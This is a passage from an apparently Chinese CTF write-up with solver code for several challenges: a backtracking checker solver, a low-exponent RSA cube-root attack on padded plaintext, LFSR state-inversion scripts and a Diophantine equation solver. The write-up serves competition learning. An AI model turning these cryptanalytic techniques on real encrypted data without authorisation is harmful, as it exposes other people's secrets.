		x = xx;</span><br><span class="line">			std::cout&lt;&lt;i&lt;&lt;<span class="string">&quot;:1&quot;</span>&lt;&lt;std::endl;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(use1 &amp;&amp; use0)&#123;</span><br><span class="line">			try_stack.<span class="built_in">push</span>(i);</span><br><span class="line">			std::cout&lt;&lt;i&lt;&lt;<span class="string">&quot;:both,choose 0&quot;</span>&lt;&lt;std::endl;</span><br><span class="line">			<span class="keyword">continue</span>;<span class="comment">// first try 0</span></span><br><span class="line">		&#125;</span><br><span class="line">		std::cout&lt;&lt;i&lt;&lt;<span class="string">&quot; cant choose &quot;</span>;</span><br><span class="line">		<span class="keyword">if</span>(!try_stack.<span class="built_in">empty</span>())&#123;</span><br><span class="line">			i = try_stack.<span class="built_in">top</span>();</span><br><span class="line">			std::cout&lt;&lt;<span class="string">&quot;return to&quot;</span>&lt;&lt;i&lt;&lt;<span class="string">&quot;:1&quot;</span>&lt;&lt;std::endl;</span><br><span class="line">			try_stack.<span class="built_in">pop</span>();</span><br><span class="line">			x &amp;=  ~((~<span class="number">0</span>)&lt;&lt;i);</span><br><span class="line">			x |= (<span class="number">1</span>&lt;&lt;i);</span><br><span class="line">			<span class="keyword">continue</span>;	</span><br><span class="line">		&#125;</span><br><span class="line">		std::cout&lt;&lt;x&lt;&lt;<span class="string">&quot; wrong&quot;</span>&lt;&lt;std::endl;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	std::cout&lt;&lt;x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">checker4</span>();</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	if(checker4_check(0b000010,4))&#123;</span></span><br><span class="line"><span class="comment">		std::cout&lt;&lt;&quot;correct&quot;;</span></span><br><span class="line"><span class="comment">	&#125;else&#123;</span></span><br><span class="line"><span class="comment">		std::cout&lt;&lt;&quot;wrong&quot;;</span></span><br><span class="line"><span class="comment">	&#125;*/</span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>做完发现其实可以F5直接看反汇编 用C语言的逻辑运算来判断更简单</p>
<h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="Baby-RSA"><a href="#Baby-RSA" class="headerlink" title="Baby RSA"></a>Baby RSA</h3><p>明文转换后长度很短 可以直接低指数加密攻击 开方<br>这里末尾补0相当于乘2的n次方 底数还是单项式 可以左右同乘逆来使得左边恢复到较小的明文 然后开方</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes,getPrime</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> log</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">baby_rsa</span>():</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    flag b&#x27;ab&#x27;</span></span><br><span class="line"><span class="string">    pad  b&#x27;ab\x00\x00&#x27;</span></span><br><span class="line"><span class="string">    hex  b&#x27;61 62 00 00&#x27;</span></span><br><span class="line"><span class="string">    int 0x6162 * 2**16</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    x = pad*8</span></span><br><span class="line"><span class="string">    (m*2**x)**e mod n = c</span></span><br><span class="line"><span class="string">    m**e * 2**xe mod n = c</span></span><br><span class="line"><span class="string">    m**e mod n = c * (2**ex)-1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    N=<span class="number">16530365897488441262718469160468305284672770158565384656092954623166151666302358404933519039638206427781958395014977873069315249917687177391054598956921816589982653878314268070746187225652226338489804977785763153836685700798637491040895954952095422949071944941698464075339538328682378899518357259255186771307748930179001187349761726049249957165990922342916419869650553300100675697071325624717861450136979864203856665171732760034460573404619831815041691417998362001038634540263831565785650815875836418726271391989975051958347165191015489214380435520924596097210274112756495171085840647510675017795358896351877011292749</span></span><br><span class="line">    c=<span class="number">1649242716162425826952050775303626268696750298411662319537259424228876945404220528279665292763881515080700349538084002211268837126748044168226799293579149622927076423346431814176280309043104500742869900600491670771220025075170550107937095925147470540522377810395335659166311121764537896320094910974901416858921029589127145477064557304982115657845643933262558300020611395670651783198790515650255634160032636409647553580657649111930945938237122361584298948645275748211120347592403311681019560483613600396814929463355821651618347651685517027239330376660444812896525930403439089808046524555500501484453485168927363278214</span></span><br><span class="line">    e=<span class="number">3</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    def pad(m):</span></span><br><span class="line"><span class="string">        return m + b&#x27;\x00&#x27; * (255 - len(m))</span></span><br><span class="line"><span class="string">    flag = b&#x27;0ops&#123;123&#125;&#x27;</span></span><br><span class="line"><span class="string">    p = 111345042336617079395655969248384725462942989722982708986115750759582884327143846096591193086377487304656518041676837325011033537087510526817704471697404176187078871161470888545207754020019021746157064253305053303512621476201052191949956657153110512813676935622000049248802125683401544972238560398010672992601</span></span><br><span class="line"><span class="string">    q = 153271507501132502258967640136039635283134834243664743747270391389487283488801676850443858493501493587201641571605287451116678489374548421733711540807596096746696511663395091514758222006766300592141141966606374343902616443452703301934074963209880423996150731879969146868471922084764152939831612389213674285053</span></span><br><span class="line"><span class="string">    print(p,q)</span></span><br><span class="line"><span class="string">    n = p * q</span></span><br><span class="line"><span class="string">    N = n</span></span><br><span class="line"><span class="string">    m=int(flag.hex(), 16)</span></span><br><span class="line"><span class="string">    print(int(flag.hex(), 16)*2**((255-len(flag))*8))</span></span><br><span class="line"><span class="string">    print(int(pad(flag).hex(), 16))</span></span><br><span class="line"><span class="string">    ct = pow(int(pad(flag).hex(), 16), e, n)</span></span><br><span class="line"><span class="string">    c = ct</span></span><br><span class="line"><span class="string">    print(&#x27;c:&#x27;,c)</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> flag_length <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>,<span class="number">40</span>):</span><br><span class="line">        <span class="comment">#if flag_length!=len(flag):</span></span><br><span class="line">            <span class="comment">#continue</span></span><br><span class="line">        <span class="built_in">print</span>(flag_length)</span><br><span class="line">        pad = <span class="number">255</span>-flag_length</span><br><span class="line">        t = e*pad*<span class="number">8</span></span><br><span class="line">        <span class="comment">#print(2**t)</span></span><br><span class="line">        inv = gmpy2.invert(<span class="number">2</span>**t,N)</span><br><span class="line">        <span class="comment">#print(inv*2**t%N)</span></span><br><span class="line">        m3 = c*inv%N</span><br><span class="line">        m,flag = gmpy2.iroot(gmpy2.mpz(m3),e)</span><br><span class="line">        <span class="keyword">if</span> flag:</span><br><span class="line">              <span class="built_in">print</span>(long_to_bytes(m.digits()))</span><br><span class="line">              <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="RSFL"><a href="#RSFL" class="headerlink" title="RSFL"></a>RSFL</h3><p>数据每次向左移一位 右边补一位为：</p>
<ul>
<li>若二进制表示中1个数为奇数 补1</li>
<li>若二进制表示中1个数为偶数 补0</li>
</ul>
<p>左边移出的信息通过右边补的体现了 lsb通过tmp给出 可以复原<br>第一种</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#from secret import flag</span></span><br><span class="line">flag = <span class="string">b&quot;0ops&#123;flagtestflagtestflagtestaa&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(flag))</span><br><span class="line">mask = <span class="number">0x9e393e7126c18da37dc14f9a3113c50c8ad4a522ae4501b20531</span></span><br><span class="line"><span class="comment">#mask =  0xffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line">limit = <span class="number">0xffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line">ri = []</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">LFSR</span>(<span class="params"><span class="built_in">input</span></span>):</span><br><span class="line">	output = (<span class="built_in">input</span> &lt;&lt; <span class="number">1</span>) &amp; limit</span><br><span class="line">	i = (<span class="built_in">input</span> &amp; mask) &amp; limit</span><br><span class="line">	a = <span class="built_in">list</span>(<span class="built_in">bin</span>(i))<span class="comment">#二进制表示1的位数是奇数</span></span><br><span class="line">	b = a.count(<span class="string">&#x27;1&#x27;</span>) % <span class="number">2</span></span><br><span class="line">	lsb = <span class="number">0</span></span><br><span class="line">	<span class="keyword">while</span> i != <span class="number">0</span>:</span><br><span class="line">		lsb ^= (i &amp; <span class="number">1</span>)</span><br><span class="line">		i = i &gt;&gt; <span class="number">1</span></span><br><span class="line">	<span class="keyword">assert</span> lsb == b</span><br><span class="line">	<span class="comment">#print(bin(output)[:10])</span></span><br><span class="line">	output ^= lsb</span><br><span class="line">	<span class="comment">#print(lsb,end=&#x27;&#x27;)</span></span><br><span class="line">	<span class="comment">#print(bin(output)[:10])</span></span><br><span class="line">	<span class="keyword">return</span> (output, lsb)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) == <span class="number">32</span></span><br><span class="line">R = <span class="built_in">int</span>.from_bytes(flag[<span class="number">5</span>: -<span class="number">1</span>], <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;R:&#x27;</span>,R)</span><br><span class="line"><span class="comment">#print(int.to_bytes(R,28,&#x27;big&#x27;))</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;R:&#x27;</span>,<span class="built_in">bin</span>(R))</span><br><span class="line">tmp = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">208</span>):</span><br><span class="line">    (R, lsb) = LFSR(R)</span><br><span class="line">    tmp = (tmp &lt;&lt; <span class="number">1</span>) | lsb</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    if i in [204,205,206]:</span></span><br><span class="line"><span class="string">        print(i,bin(R),len(bin(R))-2)</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(R)</span><br><span class="line"><span class="built_in">print</span>(tmp)</span><br><span class="line"><span class="comment">#R=tmp</span></span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#lsb只改变填充的最后一位 不改变原先的bit</span></span><br><span class="line"><span class="comment">#已知tmp是lsb 可以从第一位就开始恢复 恢复207位 然后恢复真实数据</span></span><br><span class="line">tmp = <span class="number">0xc9fe198703d93a7cff319d81c311b169de4b8d528d2dbec4859b</span></span><br><span class="line">r = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">207</span>):</span><br><span class="line">    r &lt;&lt;= <span class="number">1</span></span><br><span class="line">    lsb = (tmp &gt;&gt; (<span class="number">207</span>-i))&amp;<span class="number">1</span></span><br><span class="line">    <span class="comment">#print(lsb,end=&#x27;&#x27;)</span></span><br><span class="line">    r ^= lsb</span><br><span class="line"><span class="comment"># 这里得到的r是R207的最后207位</span></span><br><span class="line"><span class="comment"># tmp &amp; 1为R207&amp;mask 二进制中1个数的奇偶</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = r</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">207</span>):</span><br><span class="line">    n |= ((<span class="built_in">list</span>(<span class="built_in">bin</span>(n &amp; mask)).count(<span class="string">&#x27;1&#x27;</span>)%<span class="number">2</span>) ^ ((tmp&gt;&gt;i) &amp; <span class="number">1</span>)) &lt;&lt; <span class="number">207</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#print(bin(n))</span></span><br><span class="line"></span><br><span class="line">    n &gt;&gt;= <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m1 = <span class="built_in">int</span>.to_bytes(n,<span class="number">28</span>,<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(m1)</span><br><span class="line">m2 = <span class="built_in">int</span>.to_bytes(n + (<span class="number">1</span>&lt;&lt;<span class="number">207</span>),<span class="number">28</span>,<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(m2)</span><br><span class="line"><span class="comment">#reverse_an_LFSR_is_so_easy</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>第二种</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment">#from secret import flag</span></span><br><span class="line">flag = <span class="string">b&quot;0ops&#123;flagtestflagtestflagtestaa&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(flag))</span><br><span class="line">mask = <span class="number">0x9e393e7126c18da37dc14f9a3113c50c8ad4a522ae4501b20531</span></span><br><span class="line"><span class="comment">#mask =  0xffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line">limit = <span class="number">0xffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line">ri = []</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">LFSR</span>(<span class="params"><span class="built_in">input</span></span>):</span><br><span class="line">        output = (<span class="built_in">input</span> &lt;&lt; <span class="number">1</span>) &amp; limit</span><br><span class="line">        i = (<span class="built_in">input</span> &amp; mask) &amp; limit</span><br><span class="line">        a = <span class="built_in">list</span>(<span class="built_in">bin</span>(i))<span class="comment">#二进制表示1的位数是奇数</span></span><br><span class="line">        b = a.count(<span class="string">&#x27;1&#x27;</span>) % <span class="number">2</span></span><br><span class="line">        lsb = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> i != <span class="number">0</span>:</span><br><span class="line">                lsb ^= (i &amp; <span class="number">1</span>)</span><br><span class="line">                i = i &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="keyword">assert</span> lsb == b</span><br><span class="line">        <span class="comment">#print(bin(output)[:10])</span></span><br><span class="line">        output ^= lsb</span><br><span class="line">        <span class="comment">#print(lsb,end=&#x27;&#x27;)</span></span><br><span class="line">        <span class="comment">#print(bin(output)[:10])</span></span><br><span class="line">        <span class="keyword">return</span> (output, lsb)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) == <span class="number">32</span></span><br><span class="line">R = <span class="built_in">int</span>.from_bytes(flag[<span class="number">5</span>: -<span class="number">1</span>], <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;R:&#x27;</span>,R)</span><br><span class="line"><span class="comment">#print(int.to_bytes(R,28,&#x27;big&#x27;))</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;R:&#x27;</span>,<span class="built_in">bin</span>(R))</span><br><span class="line">tmp = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>*<span class="number">208</span>):</span><br><span class="line">    (R, lsb) = LFSR(R)</span><br><span class="line">    tmp = ((tmp &lt;&lt; <span class="number">1</span>) | lsb) &amp; limit</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    if i &gt;= 2*208-6:</span></span><br><span class="line"><span class="string">        print(len(bin(tmp)),bin(tmp)[:8],bin(tmp)[-4:],list(bin(tmp &amp; mask)).count(&#x27;1&#x27;))</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(R)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(<span class="built_in">bin</span>(tmp)),<span class="built_in">bin</span>(tmp)[:<span class="number">8</span>])</span><br><span class="line"><span class="comment">#R=tmp</span></span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line">tmp = <span class="number">0x8919055a184e6842a5136da171fed5e0dc979ef724acf19317d0</span></span><br><span class="line"><span class="comment">#tmp = 0xc9fe198703d93a7cff319d81c311b169de4b8d528d2dbec4859b</span></span><br><span class="line">valid_list = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789[]+=-~!@#$%^&amp;()`\\&quot;</span></span><br><span class="line">valid_list = [<span class="built_in">ord</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> valid_list]</span><br><span class="line">N = <span class="number">26</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">len</span>(<span class="built_in">list</span>(<span class="built_in">filter</span>(<span class="keyword">lambda</span> i:i <span class="keyword">in</span> valid_list,s))) &gt;= N</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">208</span>):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">100000</span>==<span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">    odd = tmp &amp; <span class="number">1</span></span><br><span class="line">    tmp = tmp &gt;&gt; <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">list</span>(<span class="built_in">bin</span>(tmp &amp; mask)).count(<span class="string">&#x27;1&#x27;</span>)%<span class="number">2</span> == odd:</span><br><span class="line">        <span class="comment">#print(0)</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        tmp |= <span class="number">1</span> &lt;&lt; <span class="number">207</span></span><br><span class="line">        <span class="comment">#print(1)</span></span><br><span class="line">    <span class="keyword">if</span> tmp ==<span class="number">0x8919055a184e6842a5136da171fed5e0dc979ef724acf19317d0</span>:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    m1 = <span class="built_in">int</span>.to_bytes(tmp,<span class="number">28</span>,<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> check(m1):</span><br><span class="line">        <span class="built_in">print</span>(m1)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./flag.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(<span class="built_in">str</span>(m1))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    m2 = <span class="built_in">int</span>.to_bytes(tmp + (<span class="number">1</span>&lt;&lt;<span class="number">207</span>),<span class="number">28</span>,<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> check(m2):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./flag.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(<span class="built_in">str</span>(m2))</span><br><span class="line">        <span class="built_in">print</span>(m2)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这个本来是给rsfl+做的  不过没做出来</p>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Baby-Equation"><a href="#Baby-Equation" class="headerlink" title="Baby Equation"></a>Baby Equation</h3><p>检索一下 可以发现这篇文章的思路说的很清楚<br><a target="_blank" rel="noopener" href="https://www.agftutoring.com/x-yz-y-xz-z-xy-4/">https://www.agftutoring.com/x-yz-y-xz-z-xy-4/</a></p>
<p>从文章中提到的论文找到准确的公式<br><a target="_blank" rel="noopener" href="http://publikacio.uni-eszterhazy.hu/2858/1/AMI_43_from29to41.pdf">http://publikacio.uni-eszterhazy.hu/2858/1/AMI_43_from29to41.pdf</a><br>然后自己手写一下脚本 根据公式算结果 加入4096bit的约束</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> fractions <span class="keyword">import</span> Fraction</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> log</span><br><span class="line">N = <span class="number">14</span></span><br><span class="line"></span><br><span class="line">a = Fraction(<span class="number">4</span>*N**<span class="number">2</span>+<span class="number">12</span>*N-<span class="number">3</span>,<span class="number">1</span>)</span><br><span class="line">b = Fraction(<span class="number">32</span>*(N+<span class="number">3</span>),<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">aa = b-Fraction(<span class="number">1</span>,<span class="number">3</span>)*a**<span class="number">2</span></span><br><span class="line">bb = Fraction(<span class="number">2</span>,<span class="number">27</span>)*a**<span class="number">3</span>-a*b/<span class="number">3</span></span><br><span class="line"><span class="comment">#print(aa,bb)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">equ</span>(<span class="params">a,b,c</span>):</span><br><span class="line">    <span class="keyword">return</span> a/(b+c)+b/(a+c)+c/(a+b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lcm_3</span>(<span class="params">a,b,c</span>):</span><br><span class="line">    lcm_ab = (a*b)//gmpy2.gcd(a,b)</span><br><span class="line">    <span class="comment">#return a*b*c</span></span><br><span class="line">    <span class="keyword">return</span> lcm_ab*c // gmpy2.gcd(lcm_ab,c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">geta</span>(<span class="params">x,y</span>):</span><br><span class="line">    <span class="keyword">return</span> (<span class="number">8</span>*(N+<span class="number">3</span>)-x+y)/(<span class="number">2</span>*(<span class="number">4</span>-x)*(N+<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getb</span>(<span class="params">x,y</span>):</span><br><span class="line">    <span class="keyword">return</span> (<span class="number">8</span>*(N+<span class="number">3</span>)-x-y)/(<span class="number">2</span>*(<span class="number">4</span>-x)*(N+<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getc</span>(<span class="params">x,y</span>):</span><br><span class="line">    <span class="keyword">return</span> ((-<span class="number">4</span>)*(N+<span class="number">3</span>)-(N+<span 